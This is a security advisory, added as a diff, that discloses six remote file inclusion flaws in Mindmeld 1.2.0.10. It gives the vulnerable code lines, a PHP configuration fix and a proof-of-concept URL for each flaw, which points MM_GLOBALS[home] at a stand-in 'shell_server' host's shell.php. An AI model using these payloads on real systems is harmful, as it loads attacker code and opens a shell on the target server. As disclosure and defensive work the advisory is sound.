@@ -1,0 +1,98 @@
+Summary
+
+Mindmeld is an, "enterprise-capable knowledge-sharing system" written  
+in PHP.  There are multiple remote file inclusion vulnerabilities in  
+Mindmeld version 1.2.0.10 (latest version).
+
+Details
+
+1. Vulnerable File and Line:
+
+Mindmeld-1.2.0.10/acweb/admin_index.php: line 51
+	require_once ( $MM_GLOBALS['home']."include/utilities.inc" );
+
+PoC:
+
+http://server/mindmeld/acweb/admin_index.php?MM_GLOBALS[home]=http://shell 
+_server/shell.php?
+
+---
+2. Vulnerable file and line:
+
+Mindmeld-1.2.0.10/include/ask.inc.php: line 34
+	require_once ( $MM_GLOBALS['home'] . "interfaces  
+{$MM_GLOBALS['interface']}/include/" .  
+"interface_{$MM_GLOBALS['interface']}_ask.inc" );
+
+PoC:
+
+http://server/mindmeld/include/ask.inc.php?MM_GLOBALS[home]=http:// 
+shell_server/shell.php?php?
+
+---
+3. Vulnerable File and Line:
+
+Mindmeld-1.2.0.10/include/learn.inc.php: line 38
+	require_once ( $MM_GLOBALS['home'] . "interfaces/ 
+{$MM_GLOBALS['interface']}/include/"
+
+PoC:
+
+http://server/mindmeld/include/learn.inc.php?MM_GLOBALS[home]=http://shell 
+_server/shell.php?
+
+---
+4. Vulnerable File and Line:
+
+Mindmeld-1.2.0.10/include/manage.inc.php: line 31
+	require_once ( $MM_GLOBALS['home'] . "interfaces/ 
+{$MM_GLOBALS['interface']}/include/"
+
+PoC:
+
+http://server/mindmeld/include/manage.inc.php?MM_GLOBALS[home]=http://shell 
+_server/shell.php?
+
+---
+5. Vulnerable File and Line:
+
+Mindmeld-1.2.0.10/include/mind.inc.php: line 33
+	require_once( $MM_GLOBALS['home'] . 'include/utilities.inc' );
+
+PoC:
+
+http://server/mindmeld/include/mind.inc.php?MM_GLOBALS[home]=http://shell 
+_server/shell.php?
+
+---
+6. Vulnerable File and Line:
+
+Mindmeld-1.2.0.10/include/sensory.inc.php: line 70
+	require_once ( $MM_GLOBALS['home'] . "include/utilities.inc" );
+
+PoC:
+
+http://server/mindmeld/include/sensory.inc.php?MM_GLOBALS[home]=http://shell 
+_server/shell.php?
+
+---
+It appears that these vulnerabilities are not vulnerable to local file  
+includes.
+
+These vulnerabilities have been disclosed to the vendor although  
+development on this software has stopped.
+
+Sources:
+
+http://mindmeld.sourceforge.net/
+
+Quick Fix:
+
+In php.ini, disable the following variables: register_globals,  
+allow_url_fopen, and allow_url_include.
+
+Credit:
+
+David Wharton
+
+# milw0rm.com [2008-01-31]
